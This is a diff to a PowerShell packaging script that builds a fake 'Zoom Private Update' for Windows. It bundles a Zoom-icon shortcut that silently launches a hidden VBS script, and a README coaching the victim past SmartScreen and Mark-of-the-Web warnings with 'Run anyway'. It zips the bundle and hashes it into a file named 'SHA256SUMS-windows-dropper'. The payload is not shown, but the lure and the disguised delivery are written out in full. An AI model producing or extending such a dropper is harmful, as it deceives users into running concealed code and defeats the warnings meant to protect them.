@@ -787,7 +787,25 @@ $link.Save()
 Copy-Item $vbs (Join-Path $here 'zoom-update-microsoft.vbs') -Force
 Copy-Item $ico (Join-Path $here "$base.ico") -Force
 
-$sums = foreach ($file in @($vbs, $ico, $lnk))
+$readme = @"
+Zoom Private Update - Windows
+
+Double-click "$base.lnk" (Zoom icon). No console, no chmod.
+The shortcut starts "$base.vbs" hidden from this same folder.
+
+If Windows shows a SmartScreen/Mark-of-the-Web prompt, choose
+"More info" -> "Run anyway".
+
+Hashes: see SHA256SUMS-windows-dropper.
+"@
+$readmePath = Join-Path $dist "$base.README.txt"
+[IO.File]::WriteAllText($readmePath, $readme, (New-Object Text.UTF8Encoding($false)))
+
+$zipPath = Join-Path $dist "$base.zip"
+Remove-Item -LiteralPath $zipPath -Force -ErrorAction SilentlyContinue
+Compress-Archive -LiteralPath @($lnk, $vbs, $ico, $readmePath) -DestinationPath $zipPath -Force
+
+$sums = foreach ($file in @($vbs, $ico, $lnk, $zipPath))
 {
     $hash = (Get-FileHash -LiteralPath $file -Algorithm SHA256).Hash.ToLowerInvariant()
     "$hash  $(Split-Path -Leaf $file)"
